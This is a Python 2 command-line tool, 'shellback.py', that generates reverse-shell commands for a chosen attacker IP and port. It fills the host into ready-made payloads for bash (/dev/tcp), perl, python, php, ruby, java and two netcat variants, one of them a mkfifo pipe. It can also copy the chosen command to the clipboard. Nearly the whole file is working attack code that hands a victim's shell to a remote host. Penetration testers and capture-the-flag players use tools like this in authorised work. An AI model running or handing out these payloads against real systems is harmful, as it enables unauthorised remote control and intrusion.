#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
from pyperclip import copy
from colorama import Fore,Back,Style
from argparse import ArgumentParser, RawTextHelpFormatter, ArgumentTypeError

# console colors
F, S, BT = Fore.RESET, Style.RESET_ALL, Style.BRIGHT
FG, FR, FC, BR = Fore.GREEN, Fore.RED, Fore.CYAN, Back.RED

def console():
    """argument parser"""
    parser = ArgumentParser(description="{}shellback.py:{} generates a reverse shell".format(BT+FG,S),formatter_class=RawTextHelpFormatter)    
    parser._optionals.title = "{}arguments{}".format(BT,S)
    parser.add_argument('-l', "--lhost", 
                    type=validateIP, 
                    help='Specify local host ip', metavar='')
    parser.add_argument('-p', "--lport", 
                    type=validatePort, default=8080,
                    help="Specify a local port [{0}default {2}{1}8080{2}]".format(BT,FG,S), metavar='')
    parser.add_argument('-v', "--version",
                    help="Specify the language to generate the reverse shell [{0}default {2}{1}bash{2}]".format(BT,FG,S),
                    default='bash', choices=['java', 'python', 'nc1', 'nc2', 'php', 'ruby', 'bash', 'perl'], metavar='')
    parser.add_argument('-f', "--tofile",
                    help="reverse-shell command to be written in a file", 
                    action='store_true')
    parser.add_argument('-c', "--copy",
                    help="Copy reverse-shell command to clipboard", 
                    action='store_true')
    args = parser.parse_args()
    return args


def getshell(host, port, pl):
    reverseShells = {
        'bash':   'bash -i >& /dev/tcp/{0}/{1} 0>&1'.format(host, port),
        'perl':   "perl -e 'use Socket;$i="+'"{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};{2}'.format(host, port, "'"),
        'python': "python -c '"+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);{2}'.format(host, port, "'"),
        'php'   : "php -r '"+'$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");{2}'.format(host, port, "'"),
        'ruby':   "ruby -rsocket -e'"+'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f){2}'.format(host, port, "'"),
        'nc1':    "nc -e /bin/sh {0} {1}".format(host, port),
        'nc2':    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f".format(host, port),
        'java':   'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])\np.waitFor()'.format(host, port)
    }
    return reverseShells[pl]


def cmd2file(cmd):
    """prepares reverse-shell command to be written in a file"""
    KEYWORDS = ["python -c '", "perl -e '", "php -r '", "ruby -rsocket -e'"]
    inlist = False
    for keyword in KEYWORDS:
        if keyword in cmd:
            inlist = True
            cmd = cmd.replace(keyword, '')[:-1]
    if inlist:
        new_cmd = map(lambda i: i.strip()+'\n', cmd.split(';'))
        return new_cmd
    else:
        return cmd


def validatePort(port):
    """For enhanced security"""
    if isinstance(int(port), (int, long)):
        if 1024 < int(port) < 65536:
            return int(port)
    else:
        raise ArgumentTypeError('{}[x] Port must be in range 1024-65535{}'.format(FR,F))


def validateIP(ip):
    try:
        if socket.inet_aton(ip):
            return ip
    except socket.error:
        raise ArgumentTypeError('{}[x] Invalid ip provided{}'.format(FR,F))


def generate(host, port, pl, cp, tofile):
    print '{0}[{1}{2}{3}{0}]{3} reverse-shell:\n'.format(BT, FG, pl, S)
    shell = getshell(host, port, pl)
    if tofile:
        shell = ''.join(cmd2file(shell))
    print shell+'\n'
    if cp:
        copy(shell)
        print '{}[+] {}{}{} reverse-shell command copied to clipboard!'.format(BT, FG, pl, S)


if __name__ == '__main__':
    args = console()
    if args.lhost:
        generate(args.lhost, args.lport, args.version, args.copy, args.tofile)
    else: 
        print '{}usage:{} shellback.py [-h] [-l] [-p] [-v] [-f] [-c]'.format(BT,S)
#_EOF